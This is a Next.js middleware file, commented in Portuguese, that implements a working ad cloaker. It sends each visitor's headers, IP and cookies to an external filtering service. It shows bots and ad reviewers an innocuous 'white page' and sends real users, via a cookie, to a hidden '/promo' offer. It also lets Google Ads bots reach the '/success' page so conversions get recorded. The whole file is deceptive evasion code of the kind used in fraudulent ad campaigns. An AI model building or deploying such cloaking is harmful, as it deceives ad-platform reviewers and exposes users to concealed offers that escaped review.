import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: 'https://www.altercpa.one/fltr/969-8f076e082dbcb1d080037ec2c216d589-15311',
  whitePagePath: '/',  // Página principal agora é white page
  offerPagePath: '/promo'  // Página de oferta
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  const hostname = request.headers.get('host') || ''
  
  // Pegar base URL do .env
  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
  
  // 🛡️ SEGURANÇA: Bloquear acesso via IP
  if (/^\d+\.\d+\.\d+\.\d+/.test(hostname)) {
    console.log('🚫 [Security] Acesso via IP bloqueado:', hostname)
    return NextResponse.redirect(new URL(baseUrl, request.url))
  }
  
  // ⚠️ MONITORAMENTO: Logar acessos sem Cloudflare (mas não bloquear)
  const cfRay = request.headers.get('cf-ray')
  if (!cfRay && !hostname.includes('localhost')) {
    console.log('⚠️ [Security] Acesso sem Cloudflare:', {
      host: hostname,
      ip: request.ip || request.headers.get('x-forwarded-for') || 'unknown'
    })
  }
  
  // Registrar acesso no analytics (não-bloqueante)
  if (!pathname.startsWith('/_next') && !pathname.startsWith('/api/s7k2m9p4') && pathname !== '/x9f2w8k5') {
    try {
      const userAgent = request.headers.get('user-agent') || ''
      const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || request.headers.get('x-real-ip') || 'unknown'
      const referer = request.headers.get('referer') || ''
      const query = request.nextUrl.search
      
      // Fazer requisição assíncrona sem aguardar
      fetch(`${request.nextUrl.origin}/api/s7k2m9p4`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          path: pathname,
          userAgent,
          ip,
          referer,
          query
        })
      }).catch(() => {}) // Ignorar erros silenciosamente
    } catch (error) {
      // Ignorar erros de analytics
    }
  }
  
  // Rotas da whitepage que NUNCA devem passar pelo cloaker
  // IMPORTANTE: "/" NÃO está aqui - deve passar pelo cloaker!
  const whitePageRoutes = ['/loja', '/unsubscribe', '/ativar-conversao-google', '/meus-pedidos', '/blog']
  const isWhitePageRoute = whitePageRoutes.includes(pathname) || pathname.startsWith('/produto/') || pathname.startsWith('/blog/')
  
  // Verificar domínio - ativar cloaker para o domínio configurado
  const targetDomain = baseUrl.replace('https://', '').replace('http://', '')
  const isTargetDomain = hostname.includes(targetDomain)
  
  // CLOAKER ATIVADO apenas para o domínio configurado
  if (!isTargetDomain) {
    console.log(` [Cloaker] Domínio não é ${targetDomain} - desativado`)
    return NextResponse.next()
  }
  
  // Verificar se o cloaker está habilitado
  const cloakerEnabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
  
  if (!cloakerEnabled) {
    console.log('🔓 [Cloaker] Desativado via env (NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED)')
    return NextResponse.next()
  }
  
  // Rotas da whitepage sempre acessíveis (sem verificação de cloaker)
  if (isWhitePageRoute) {
    console.log(`✅ [Whitepage] Rota "${pathname}" sempre acessível - sem cloaker`)
    return NextResponse.next()
  }

  // Proteger rota /promo - APENAS acessível com cookie do cloaker
  // Usuários que tentarem acessar direto (mesmo com gclid) serão bloqueados
  if (pathname === '/promo' || pathname === '/promo/') {
    const hasValidCookie = request.cookies.get('cloaker_verified')?.value === 'true'
    
    // Se não tem cookie do cloaker, bloquear SEMPRE
    if (!hasValidCookie) {
      console.log('🚫 [Cloaker] Acesso a /promo sem cookie do cloaker - redirecionando para /')
      return NextResponse.redirect(new URL('/', request.url))
    }
    
    // Se tem cookie válido, deixar passar
    console.log('✅ [Cloaker] Acesso a /promo permitido (cookie válido)')
    return NextResponse.next()
  }

  // Proteger rota /success - mas permitir Google Ads Bot
  if (pathname.startsWith('/success')) {
    const userAgent = request.headers.get('user-agent') || ''
    const url = request.nextUrl
    const hasTransactionId = url.searchParams.has('transactionId')
    const hasAmount = url.searchParams.has('amount')
    const hasValidCookie = request.cookies.get('cloaker_verified')?.value === 'true'
    
    // Detectar bots do Google (Googlebot, AdsBot, etc)
    const isGoogleBot = /googlebot|adsbot-google|google-ads/i.test(userAgent)
    
    // Se é bot do Google, deixar passar SEMPRE (para registrar conversão)
    if (isGoogleBot) {
      console.log('🤖 [Success] Google Bot detectado - permitindo acesso')
      return NextResponse.next()
    }
    
    // Se não é bot e não tem parâmetros, redirecionar para white page
    if (!hasTransactionId || !hasAmount) {
      console.log('🚫 [Success] Acesso sem parâmetros obrigatórios - redirecionando para /')
      return NextResponse.redirect(new URL('/', request.url))
    }
    
    // Se não tem cookie do cloaker, bloquear (usuário tentando acessar direto)
    if (!hasValidCookie) {
      console.log('🚫 [Success] Acesso sem cookie do cloaker - redirecionando para /')
      return NextResponse.redirect(new URL('/', request.url))
    }
    
    // Se tem parâmetros válidos E cookie do cloaker, deixar passar
    console.log('✅ [Success] Acesso permitido (cookie válido + parâmetros)')
    return NextResponse.next()
  }

  // Não aplicar cloaker nas rotas internas e arquivos estáticos (deixar passar)
  if (
    pathname.startsWith('/api') ||
    pathname.startsWith('/_next/') ||
    pathname.startsWith('/images') ||
    // pathname.startsWith('/success') || // REMOVIDO - /success tem verificação própria acima
    pathname.startsWith('/checkout') ||
    pathname.startsWith('/x9f2w8k5') ||
    pathname.startsWith('/analytics') ||
    pathname.startsWith('/fonts') ||
    pathname.startsWith('/manifest') ||
    pathname.startsWith('/icon-') ||
    pathname.startsWith('/sw.js') ||
    pathname === '/robots.txt' ||
    pathname === '/sitemap.xml' ||
    pathname === '/favicon.ico' ||
    pathname === '/favicon.svg' ||
    pathname.includes('.js') ||
    pathname.includes('.css') ||
    pathname.includes('.png') ||
    pathname.includes('.jpg') ||
    pathname.includes('.ico') ||
    pathname.includes('.svg') ||
    pathname.includes('.woff') ||
    pathname.includes('.woff2') ||
    pathname.includes('.json') ||
    pathname.includes('.xml')
  ) {
    return NextResponse.next()
  }

  // Se não for rota raiz (/), redirecionar para / (white page)
  // Isso captura TODAS as rotas inválidas
  if (pathname !== '/') {
    console.log(`🚫 [Cloaker] Rota inválida "${pathname}" - redirecionando para / (white page)`)
    return NextResponse.redirect(new URL('/', request.url))
  }

  // IMPORTANTE: Se usuário tem cookie válido, REDIRECIONAR para /promo
  // Usuário real NUNCA deve ver white page novamente
  const hasValidCookie = request.cookies.get('cloaker_verified')?.value === 'true'
  
  if (hasValidCookie) {
    console.log('✅ [Cloaker] Usuário com cookie válido - redirecionando para /promo')
    return NextResponse.redirect(new URL('/promo', request.url))
  }

  try {
    // Preparar dados do servidor EXATAMENTE como o PHP faz
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: request.headers.get('user-agent') || '',
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: request.headers.get('referer') || '',
      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
      REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
      REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
      REQUEST_METHOD: request.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: request.nextUrl.search.substring(1),
      HTTP_COOKIE: request.headers.get('cookie') || '',
      HTTP_SEC_CH_UA: request.headers.get('sec-ch-ua') || '',
      HTTP_SEC_CH_UA_MOBILE: request.headers.get('sec-ch-ua-mobile') || '',
      HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
    }

    console.log('🔍 [Cloaker] Verificando acesso:', {
      ip: serverData.HTTP_CF_CONNECTING_IP || serverData.REMOTE_ADDR,
      userAgent: serverData.HTTP_USER_AGENT,
      referer: serverData.HTTP_REFERER || 'direct',
      queryString: serverData.QUERY_STRING,
      url: request.nextUrl.pathname + request.nextUrl.search
    })

    // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const cloakerResponse = await fetch(CLOAKER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept-Encoding': 'gzip, deflate, br'
      },
      body: formBody
    })

    let result: { type: string; url: string; result?: string; action?: string; reason?: number }

    const responseText = await cloakerResponse.text()
    
    if (responseText && responseText.trim()) {
      try {
        result = JSON.parse(responseText)
        console.log('📥 [Cloaker] Resposta:', {
          type: result.type,
          result: result.result,
          action: result.action,
          reason: result.reason,
          url: result.url,
          referer: serverData.HTTP_REFERER || 'direct'
        })
      } catch (e) {
        console.log('⚠️ [Cloaker] Erro ao parsear JSON - usando fallback (white)')
        result = {
          type: 'white',
          url: baseUrl + '/'
        }
      }
    } else {
      console.log('⚠️ [Cloaker] Resposta vazia - usando fallback (white)')
      // Fallback IGUAL ao PHP: se vazio, mostrar white page
      result = {
        type: 'white',
        url: baseUrl + '/'
      }
    }

    // Se for "white" (bot/crawler), mostrar white page (/)
    if (result.type === 'white') {
      console.log('🤖 [Cloaker] BOT detectado - mostrando white page (/)')
      // Deixar passar normalmente - a rota / já é a white page
      return NextResponse.next()
    }

    // Se for "black" (usuário real), REDIRECIONAR para /promo com cookie
    console.log('👤 [Cloaker] USUÁRIO REAL - redirecionando para /promo')
    
    // Criar URL sem barra final
    const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
    // Manter query params (gclid, utm, etc)
    redirectUrl.search = request.nextUrl.search
    
    // Criar resposta com cookie de verificação (httpOnly - não pode ser forjado)
    const response = NextResponse.redirect(redirectUrl)
    response.cookies.set('cloaker_verified', 'true', {
      httpOnly: true,  // Cookie não acessível via JavaScript
      secure: true,    // Apenas HTTPS
      sameSite: 'lax', // Proteção CSRF
      maxAge: 60 * 60 * 24 // 24 horas
    })
    
    return response

  } catch (error) {
    // Em caso de erro, mostrar white page por segurança (silencioso)
    const url = request.nextUrl.clone()
    url.pathname = CLOAKER_CONFIG.whitePagePath
    return NextResponse.rewrite(url)
  }
}

// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    /*
     * Match em TODAS as rotas, exceto arquivos estáticos
     * O middleware vai validar e redirecionar rotas inválidas
     */
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}
